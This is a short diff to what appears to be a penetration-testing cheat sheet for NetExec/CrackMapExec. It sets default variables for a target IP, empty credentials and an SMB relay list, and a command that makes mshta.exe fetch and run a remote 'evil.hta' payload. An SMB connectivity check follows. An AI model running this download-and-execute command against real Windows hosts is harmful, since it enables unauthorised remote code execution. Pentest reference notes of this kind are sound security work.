@@ -1,10 +1,10 @@
 % NetExec / CrackMapExec
 
-;$ ip: $ip
-;$ username: ''
-;$ password:  ''
-;$ relay-file: 'relay-list.txt'
-;$ command: 'mshta.exe http://<ip>/evil.hta'
+$ ip: $ip
+$ username: ''
+$ password:  ''
+$ relay-file: 'relay-list.txt'
+$ command: 'mshta.exe http://<ip>/evil.hta'
 
 # SMB Connectivity Check
 nxc smb <ip>
